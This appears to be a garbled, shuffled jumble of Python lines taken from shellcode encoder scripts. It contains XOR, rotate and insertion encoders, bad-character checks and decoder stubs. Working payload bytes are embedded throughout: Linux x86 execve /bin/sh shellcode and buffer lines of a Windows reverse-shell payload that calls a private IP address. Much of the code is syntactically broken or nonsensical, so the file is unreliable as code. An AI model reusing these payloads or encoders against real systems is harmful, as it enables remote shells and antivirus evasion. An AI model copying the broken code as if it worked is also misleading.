bad_chars = '\x0a\x00\x0d'
bad_chars = '\\x' [ 3 : ]
break
break =
break
break
buf += b'\x02\x00\x01\xbb\x89\xe6\x6a\x10\x56\x57\x68\x99\xa5'
buf += b'\x0d\x01\xc7\xe2\xf2\x52\x57\x8b\x52\x10\x8b\x4a\x3c'
buf += b'\x4a\x26\x31\xff\xac\x3c\x61\x7c\x02\x2c\x20\xc1\xcf'
buf += b'\x50\x30\x8b\x52\x0c\x8b\x52\x14\x8b\x72\x28\x0f\xb7'
buf += b'\x54\x50\x56\x56\x56\x46\x56\x4e\x56\x56\x53\x56\x68'
buf += b'\x5f\x5a\x8b\x12\xeb\x8d\x5d\x68\x33\x32\x00\x00\x68'
buf += b'\x68\x08\x87\x1d\x60\xff\xd5\xbb\xf0\xb5\xa2\x56\x68'
buf += b'\x68\xf0\xb5\xa2\x56\xff\xd5\x68\x63\x6d\x64\x00\x89'
buf += b'\x74\x61\xff\xd5\x85\xc0\x74\x0c\xff\x4e\x08\x75\xec'
buf += b'\x75\x05\xbb\x47\x13\x72\x6f\x6a\x00\x53\xff\xd5'
buf += b'\x77\x73\x32\x5f\x54\x68\x4c\x77\x26\x07\xff\xd5\xb8'
buf += b'\x79\xcc\x3f\x86\xff\xd5\x89\xe0\x4e\x56\x46\xff\x30'
buf += b'\x89\x44\x24\x24\x5b\x5b\x61\x59\x5a\x51\xff\xe0\x5f'
buf += b'\x8b\x0c\x4b\x8b\x58\x1c\x01\xd3\x8b\x04\x8b\x01\xd0'
buf += b'\x8b\x4c\x11\x78\xe3\x48\x01\xd1\x51\x8b\x59\x20\x01'
buf += b'\x90\x01\x00\x00\x29\xc4\x54\x50\x68\x29\x80\x6b\x00'
buf += b'\xa6\x95\xbd\x9d\xff\xd5\x3c\x06\x7c\x0a\x80\xfb\xe0'
buf += b'\xc7\x44\x24\x3c\x01\x01\x8d\x44\x24\x10\xc6\x00\x44'
buf += b'\xd3\x8b\x49\x18\xe3\x3a\x49\x8b\x34\x8b\x01\xd6\x31'
buf += b'\xdf\xe0\xff\xd5\x97\x6a\x05\x68\xc0\xa8\x74\xc7\x68'
buf += b'\xe3\x57\x57\x57\x31\xf6\x6a\x12\x59\x56\xe2\xfd\x66'
buf += b'\xf8\x3b\x7d\x24\x75\xe4\x58\x8b\x58\x24\x01\xd3\x66'
buf += b'\xfc\xe8\x82\x00\x00\x00\x60\x89\xe5\x31\xc0\x64\x8b'
buf += b'\xff\xac\xc1\xcf\x0d\x01\xc7\x38\xe0\x75\xf6\x03\x7d'
buf += b'\xff\xd5\x50\x50\x50\x50\x40\x50\x40\x50\x68\xea\x0f'
buf = b''
i = ( y + ROT ) % 256
temp = '%02x' ^ XOR
temp = z << nbits
shellcode = chunk [ : 2 ]
chunk_no += 1
chunk_no = 0
count += 1
count = 1
g += 1
weight = 0
Dec_hopcode = int ( encoded )
encoded += '\\x'
z = '%02x' % x
surname = ''
"decoded2 += '%02x, ' % x"
encoded += '0x'
encoded = ''
decoder_stub . append ( '\x02\xeb\xe4\xe8\xdc\xff\xff\xff' )
decoder_stub += '\x1c\x0f\x88\xdf\x88\xd0\x30\xd8'
decoder_stub . append ( '\x31\xd8\x66\x89\x07\x41\x8d\x7f' )
decoder_stub . append ( '\x74\x16\x66\x8b\x44\x0f\x01\x66' )
decoder_stub += '\xb2\x45\xeb\x1f\x5e\x8d\x3e\x8a'
decoder_stub += '\x31\xd2\x5e\xbf\x90\x90\xaa\xaa'
decoder_stub += '\x3c\x16\x32\x0c\x16\x32\x2c\x16'
decoder_stub += '\x42\x42\x83\xc0\x04\x75\xc5\xff'
decoder_stub += '\x7c\x04\x02\x88\x5c\x04\x03\x39'
decoder_stub += '\x7c\x16\x05\x74\x0a\x42\x42\x42'
decoder_stub += '\x7f\x83\xec\x7f\x8a\x5c\x16\x01'
decoder_stub += '\x83\xec\x7f\x83\xec\x7f\x83\xec'
decoder_stub += '\x88\x2c\x04\x88\x4c\x04\x01\x88'
decoder_stub += '\x8a\x6c\x16\x04\x32\x1c\x16\x32'
decoder_stub += '\x8a\x7c\x16\x02\x8a\x4c\x16\x03'
decoder_stub += '\xe4\xe8\xa4\xff\xff\xff'
decoder_stub = '\x31\xc0\x31\xdb\x31\xc9\x31\xd2'
decoder_stub = '\xeb\x57\x31\xc0\x31\xdb\x31\xc9'
"except(var0, = 'E'.replace(', ', xor_byte)"
unicode [1].append([decoder_stub for i in decoder_stub) if decoder_stub [1])
"def find_valid_xor_byte ( bytes , bad_chars ) : "
def convert ( bvar0 ) : 
"def rol ( file , n , n , Width = len ( Width )  : "
"def ror ( file , n , n , Width = len ( Width )  : "
if change == '0x0' : 
finally:
elif
"encoded += '%02x, ' % x"
a += 0x
a += 0xAA
TOKEN_BLOCK = ''
encoded += '\n'
encoded += '\n'
encoded += '\\x'
"encoded += '%02x, ' % 0xAA"
"encoded += '%02x, ' % encoded"
"encoded += '%02x, ' % random . randint ( 1 )"
encoded += '\n'
encoded += '\n'
"encoded += '%02x,%a"
encoded += '%02x' % y
"encoded += '%02x, ' % 0xff"
encoded += '%02x' % x
"encoded += '%02x, ' % x"
"encoded += '%02x, ' % y"
"encoded += '%02x, ' % y"
"encoded += '%02x, ' % y"
encoded += encoded % z
"encoded += '%02x, ' % x"
"encoded += '%02x, ' % random . randint ( 'hex' )"
insertByte += insertByte + 2
"encoded += '%02x, ' % ( 7 , line )"
encoded = ''
'\\x' = ''
encoded = ''
encoded = ''
encoded = ''
surname = ''
"encoded = '\\x' % len ( shellcode ) , ', '"
var0 = [ ]
'''encoded += \\x'''
encoded_instruction_in_hex = '%02x' % rox_encoded_instruction
"encoded_nasm += '%02x, ' % ( z & 0xff )"
encoded_nasm += '0x'
encoded_nasm = ''
"encoded_shellcode += '%02x, ' % z"
"encoded_shellcode += '%02x, ' % ', '"
"encoded_shellcode += '%02x, ' % z"
"encoded_shellcode += '%02x, ' % z"
encoded_shellcode += '0x'
encoded_shellcode += '\\x'
"encoded_shellcode += '%02x, ' % ( z & 0xff )"
encoded_shellcode = ''
encoded_shellcode = ''
temp += encoded % byte
temp += encoded % byte
temp += encoded % b
temp += encoded % byte
encoded1 += '\\x'
"encoded1 += '%02x, ' % encoded1"
encoded = ''
"encoded2 += ', '"
"encoded2 += '%02x, ' % x"
"encoded2 += '%02x, ' % ( y & bitwise )"
"encoded2 += '%02x, ' % x"
"encoded2 += '%02x, ' % x"
"encoded2 += '%02x, ' % y"
"encoded2 += '%02x, ' % ( p - 7 )"
"encoded2 += '%02x, ' + bitwise & 0xff"
"encoded2 += '%02x, ' % x"
"encoded2 += '%02x, ' % y"
encoded2 . append ( '0x' )
encoded2 += '0x'
encoded2 += '0x'
encoded2 += '0x' % 0xAA
"encoded2 += '%02x, ' % a"
encoded2 += hex ( leader ) [ 2 : ]
insertByte = insertByte [ 2 : - 2 ]
"encoded2 += '%02x, '"
encoded2 = ''
encoded2 = '0x'
encoded2 = ''
encoded2 = ''
encoded2 = ''
encoded = ''
encoded2 = '0x' % len ( bytearray ( shellcode ) )
"encoded2P2 += '%02x, ' % x"
encoded2P2 . append ( '0x' )
encoded2P2 = ''
encodedP2 . append ( '\\x' )
encodedP2 += x % x
encodedP2 = ''
end = '\\xaa'
except: = 30
execve_shellcode = bytearray ( b'\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x87\xe3\xb0\x0b\xcd\x80' )
execve_shellcode = bytearray ( )
execve_shellcode . append ( 0x90 )
line = 1
exit ( 1 )
exit ( 2 )
exit ( 6 )
fb = int ( hex ( leader ) [ 2 : ] )
final_shellcode += '\\x' + byte . encode ( 'hex' )
for bad_byte in bad_chars : 
for bytes in bad_chars : 
for chunk in 10 : 
for chunk in decoder_stub : 
for var in decoder_stub : 
for var in encoder : 
for char in bad_chars : 
for y in bytearray ( shellcode ) : 
for i in bytearray ( shellcode ) : 
for var:
"for i in range ( 2 , 128 ) : "
"for i in range ( 2 , 2 ) : "
"for i in range ( 2 , 4 ) : "
"for i in range ( 2 , bytes ) : "
for x in bytearray ( buf ) : 
for y in bytearray ( shellcode ) : 
for x in bytearray ( shellcode ) : 
for x in bytearray ( shellcode ) : 
for y in bytearray ( shellcode ) : 
for x in bytearray ( shellcode ) : 
for j in bytearray ( x ) [ 2 : ] : 
for y in bytearray ( shellcode ) : 
format_0x += '0x'
"format_0x += encoded_instruction_in_hex + ', '"
format_0x = ''
format_slash_x = ''
h = ( y + magic ) % 256
hopcode = x % x
i += i + i
i += i + i
seconds = 2
"if ''0x0aec, '' in format_0x: '"
if len ( execve_shellcode ) == 2 : 
"if struct . pack ( r , bitwise ) == i : "
if char == 7 : 
if count ( ) in 4 : 
if counter % 2 == 0 : 
if i < len ( subject ) : 
if str ( c ) == i : 
if x . join ( z ) + i : 
if len ( shellcode_original ) != 4 : 
if len ( sys . argv ) == 3 : 
if len ( sys . argv ) < 2 : 
if len ( sys . argv ) >= 3 : 
if len ( sys . argv ) : 
if len ( sys . argv ) > 3 : 
if matched_a_byte : 
if n >= 0 : 
if matched_a_byte is not True : 
if padding : 
if len ( shell ) < 1 : 
if a < 1 : 
"if struct . pack ( bytes , val1 ^ i ) and bad_byte == 2 : "
if stub_has_bad_char : 
if total == 2 : 
if x < l : 
if x == 12 : 
if x . lower ( ) in shellcode . lower ( ) : 
if x > digits : 
if x > l : 
if xor_byte : 
import gettext
import random
import random
import random
import random
import gettext
import sys
import gettext
import sys
"insertByte = random . randint ( 1 , 255 )"
g = i + magic
leader = int ( sys . argv [ 1 ] )
if(len(shellcode))
"length_format_0x = format_0x . count ( ', ' )"
digits = set ( values )
mask_value = input ( seconds )
matched_a_byte = False
matched_a_byte = True
max_bits = 7
n = bitwise & n . encode ( 'hex' )
n += 1
n = value
n = bytearray + shellcode . strip ( )
nasm = nasm [ 2 : ]
"encoded = str ( encoded ) % ',0x'"
nbits = sys . argv [ sys . argv ]
"new = i , 0xff"
new = new ^ b
new = new << shift
offset = 1
orig = [ ]
orig += digit
original_shellcode += x % x
original_shellcode . append ( '0x' )
original_shellcode = ''
__D = 'NullBooleanField('
doublecolon_len = 0
padding = 4 - len ( shellcode_original ) % 4
"c = random . randint ( 1 , 255 )"
"formatted = random . randint ( 1 , 100 )"
break = 10
i = x << val1 >> val2
res1 = x << val2 & val1
res2 = x & val1
res2 = res2 & val1
res2 = res2 + val2
i = x << max_bits - val2
"return bitwise ( s . replace ( 3 , 0 ) )"
return bitwise >> n & bitwise >> 3 and var1
return 0
return 2 ** n - 1
return i
return n
return value
rev_suplx = hex ( suplX . count ( ) )
rot = 365
delta = int ( sys . argv ) [ 0 ]
new = new << rotations
rox_encoded_instruction = res1 | res1 . res2
sb = int ( hex ( leader ) [ 3 : ] )
shellcode = ( '\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x89\xe2\x53\x89\xe1\xb0\x0b\xcd\x80' )
shellcode = ( '\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x87\xdc\xb0\x0b\xcd\x80' )
def shellcode() and('1ÀPh//shh/binã1ÉÊjXÍ'):
def shellcode() and('1ÀPh//shh/binãPâSá°Í'):
shellcode = ( '\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x89\xe2\x53\x89\xe1\xb0\x0b\xcd\x80' )
shellcode = ( '\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x89\xe2\x53\x89\xe1\xb0\x0b\xcd\x80' )
digits = ( '\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x89\xe2\x53\x89\xe1\xb0\x0b\xcd\x80' + shellcode + '\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x89\xe2\x53\x89\xe1\xb0\x0b\xcd\x80' )
shellcode = ( '\x31\xc0\x50\x68\x62\x61\x73\x68\x68\x62\x69\x6e\x2f\x68\x2f\x2f\x2f\x2f\x89\xe3\x50\x89\xe2\x53\x89\xe1\xb0\x0b\xcd\x80' )
shellcode = ( '\x31\xc0\x50\x68\x6e\x2f\x73\x68\x68\x2f\x2f\x62\x69\x89\xe3\x50\x89\xe2\x53\x89\xe1\xb0\x0b\xcd\x80' )
digits = ( '\x31\xc0\x50\x89\xe2\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\xb0\x0b\xcd\x80' + shellcode + '\x31\xc0\x50\x89\xe2\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\xb0\x0b\xcd\x80' )
shellcode = 8
shellcode = shellcode [ : ]
shellcode = '\\x' [ : 3 ]
digits = ( '\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x89\xe2\x53\x89\xe1\xb0\x0b\xcd\x80' + shellcode + '\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x89\xe2\x53\x89\xe1\xb0\x0b\xcd\x80' )
shellcode_encoded = bitearray
shellcode_encoded_hex = hex ( shellcode_encoded . strip ( ) )
shellcode_encoded_nasm = hex ( shellcode_encoded . strip ( '0x' ) for x in shellcode_encoded )
shellcode_encoded . append ( 0x90 )
shellcode_encoded . append ( 0xaa )
shellcode_encoded = int ( result )
shellcode_encoded = shellcode_original + i [ i : ]
shellcode_encoded += shellcode_original + i+1.split('\n')
shellcode_encoded += shellcode_original + i+2.split('\n')
shellcode_encoded += shellcode_original + i+3.split('\n')
shellcode_file = sys . argv [ 1 ]
shellcode_len = len ( execve_shellcode )
g = '\t' . read ( f . read ( ) . strip ( ) . strip ( ) )
shellcode_original_hex = hex ( shellcode_original . strip ( ) )
shellcode_original += 0x90
delta = int ( sys . argv )
string1 = var2 % decoder_stub
stub_has_bad_char = False
stub_has_bad_char = True
subfs = fb - encoded
suplX = os . compile ( Dec_hopecode )
a = [ ]
a += i
a += i + execve_shellcode
"for a in range ( ', ' ) : "
if a in '0x' ( '0x' ) : 
represenation = bytearray ( sys . argv )
exit ( )
sys = sys ( 0 )
j = len ( )
try:
i = int ( seconds // 1 )
"val1 = int ( byte . encode ( 'hex' ) , 32 )"
"val2 = int ( chunk [ i ] . encode ( 'hex' ) , 32 ) & xor_byte"
val2 = modulo % val2
error_msg = 'NullBooleanField('
if len ( shellcode ) : 
if x < shellcode_len : 
if var . endswith ( xor_byte_good ) : 
"f.open(bvar0, ''wb'')"
x += 1
x = 2
x = x
x
x = x & magic
res = x
x = x ^ 60
x = x ^ y
x = x ^ y
x = x ^ y
weight = int ( sys . argv )
XOR = sys . argv [ sys . argv ]
xor_byte = 0
"g = find_valid_xor_byte ( chunk , bad_chars )"
"g = find_valid_xor_byte ( string1 , bad_chars )"
xor_byte_good = False
xor_byte_good = True
g = '%02x' % encoded
length_var1 = indicies + subfs . strip ( int ( subfs ) )
temp = int ( y . format ( x ) [ i ] )
ERROR = 'file'
y = x
bitwise = bitwise [ shellcode - 2 ] . strip ( 0 )
y = x ^ 0x88
y = x ^ 0x97
y = x ^ nbits
y = x ^ int ( shellcode )
new = x x x
